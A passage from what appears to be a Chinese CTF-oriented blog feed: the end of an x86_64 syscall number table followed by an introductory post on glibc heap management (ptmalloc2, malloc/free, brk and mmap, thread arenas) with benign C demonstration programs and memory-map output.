class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd_settime 286</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd_gettime 287</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept4 288</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd4 289</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd2 290</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create1 291</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup3 292</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe2 293</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init1 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_preadv 295</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwritev 296</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_perf_event_open 298</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmmsg 299</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fanotify_init 300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fanotify_mark 301</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prlimit64 302</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_name_to_handle_at 303</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open_by_handle_at 304</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_adjtime 305</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syncfs 306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmmsg 307</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setns 308</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcpu 309</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_process_vm_readv 310</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_process_vm_writev 311</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kcmp 312</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_finit_module 313</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setattr 314</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getattr 315</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat2 316</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_seccomp 317</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrandom 318</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_memfd_create 319</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_file_load 320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execveat 322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_membarrier 324</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock2 325</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_copy_file_range 326</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_preadv2 327</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwritev2 328</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pkey_mprotect 329</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pkey_alloc 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pkey_free 331</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statx 332</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统调用号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆基础知识</title>
      <link href="archives/bdc99b7b/"/>
      <url>archives/bdc99b7b/</url>
      
        <content type="html"><![CDATA[<h1 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h1><blockquote><p>内容绝大部分来自ctf-wiki，文章用于自己学习记录</p></blockquote><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>在程序运行过程中，<strong>堆可以提供动态分配的内存</strong>，允许程序申请大小未知的内存<a href="%E6%97%A0%E6%B3%95%E6%8F%90%E5%89%8D%E9%A2%84%E7%9F%A5%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%EF%BC%8C%E6%9B%B4%E5%A4%9A%E6%98%AF%E6%A0%B9%E6%8D%AE%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E9%9C%80%E8%A6%81%E8%80%8C%E5%8A%A8%E6%80%81%E5%8F%98%E5%8C%96">^1</a>。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。</p><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ol><li>响应用户的申请内存请求，向操作系统<strong>申请内存</strong>，然后将其返回给用户程序。同时，为了保持内存管理的高效性，<strong>内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互</strong>。</li><li><strong>管理用户所释放的内存</strong>。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ol><p>Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><p>这里我们主要介绍</p><ul><li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用</li><li>介绍堆目前的多线程支持。</li></ul><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.c</a> 中，malloc 的说明如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">  malloc(size_t n)</span><br><span class="line">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="line">  if no space is available. Additionally, on failure, errno is</span><br><span class="line">  set to ENOMEM on ANSI C systems.</span><br><span class="line">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="line">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="line">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="line">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="line">  of space, which will often fail. The maximum supported value of n</span><br><span class="line">  differs across systems, but is in all cases less than the maximum</span><br><span class="line">  representable value of a size_t.</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>可以看出，malloc 函数返回对应大小字节的内存块的<strong>指针</strong><a href="%E5%AE%9E%E9%99%85%E4%B8%8A%E8%BF%98%E9%9C%80%E8%BF%9B%E8%A1%8C%E5%AF%B9%E9%BD%90%E7%AD%89%E6%93%8D%E4%BD%9C%EF%BC%8C%E8%BF%94%E5%9B%9E%E5%86%85%E5%AD%98%E5%9D%97%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%98%AF%E5%AF%B9%E5%BA%94%E5%A4%A7%E5%B0%8F%E7%9A%84">^2</a>。此外，该函数还对一些异常情况进行了处理</p><ul><li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是<code>无符号数</code>（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.c</a> 中，free 的说明如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">      free(void* p)</span><br><span class="line">      Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="line">      allocated using malloc or a related routine such as realloc.</span><br><span class="line">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="line">      effects if p has already been freed.</span><br><span class="line">      Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="line">      when possible, automatically trigger operations that give</span><br><span class="line">      back unused memory to the system, thus reducing program footprint.</span><br><span class="line">    *&#x2F;</span><br></pre></td></tr></table></figure><p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。<a href="%E8%BF%98%E9%9C%80%E8%A6%81%E6%A0%B9%E6%8D%AE%E5%86%85%E5%AD%98%E5%9D%97%E7%9A%84%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E8%BF%98%E7%BB%99%E7%B3%BB%E7%BB%9F">^3</a></li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><p>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。[^4]</p><p>[^4]:也就是相当于 malloc 是一个整合包，打包好实现申请堆块需要用到的所有函数。类似的函数还有 system 等</p><p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p><p><img src="img/brk&mmap.png" alt="brk&amp;mmap.png"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 <a href="https://en.wikipedia.org/wiki/Sbrk">brk</a> 的大小来向操作系统申请内存。</p><p>初始时，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><p>具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示</p><p><img src="img/program_virtual_address_memory_space.png" alt="program_virtual_address_memory_space.png"></p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc sbrk_brk_example.c -m32 -o ./sbrk_brk_example</span></span><br></pre></td></tr></table></figure><p>需要注意的是，在每一次执行完操作后，都执行了 getchar() 函数，这是为了我们方便我们查看程序真正的映射。</p><p><strong>在第一次调用 brk 之前</strong></p><p>从下面的输出可以看出，并没有出现堆。因此</p><ul><li>start_brk = brk = end_data = 0x806c000</li></ul><p><img src="img/chunk0.png" alt="chunk0.png"></p><p><strong>第一次增加 brk 后</strong></p><p>从下面的输出可以看出，已经出现了堆段</p><ul><li>start_brk = end_data = 0x806c000</li><li>brk = 0x806d000</li></ul><p><img src="img/chunk1.png" alt="chunk1.png"></p><p>其中，关于堆的那一行</p><ul><li>0x806c000是相应堆的起始地址</li><li>rw-p 表明堆具有可读可写权限，并且属于隐私数据。</li><li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。</li><li>00:00 是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。</li><li>0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。</li></ul><p>然后通过 <code>brk(tmp_brk);</code> 将指针归位回到 0x806c000 ，新出现的 heap 消失。具体和第一步图一样，不贴图了。</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 <a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285">mmap</a> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在执行 mmap 之前</strong></p><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>mmap 后</strong></p><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>munmap</strong></p><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;syscalls$ cat &#x2F;proc&#x2F;6067&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;syscalls&#x2F;mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;syscalls&#x2F;mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;syscalls&#x2F;mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;syscalls$</span><br></pre></td></tr></table></figure><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p><p>这里给出一个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Per thread arena example. *&#x2F;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">void* threadFunc(void* arg) &#123;</span><br><span class="line">        printf(&quot;Before malloc in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        char* addr &#x3D; (char*) malloc(1000);</span><br><span class="line">        printf(&quot;After malloc and before free in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(addr);</span><br><span class="line">        printf(&quot;After free in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">        pthread_t t1;</span><br><span class="line">        void* s;</span><br><span class="line">        int ret;</span><br><span class="line">        char* addr;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Welcome to per thread arena example::%d\n&quot;,getpid());</span><br><span class="line">        printf(&quot;Before malloc in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        addr &#x3D; (char*) malloc(1000);</span><br><span class="line">        printf(&quot;After malloc and before free in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(addr);</span><br><span class="line">        printf(&quot;After free in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        ret &#x3D; pthread_create(&amp;t1, NULL, threadFunc, NULL);</span><br><span class="line">        if(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Thread creation error\n&quot;);</span><br><span class="line">                return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        ret &#x3D; pthread_join(t1, &amp;s);</span><br><span class="line">        if(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Thread join error\n&quot;);</span><br><span class="line">                return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ .&#x2F;mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ cat &#x2F;proc&#x2F;6501&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span 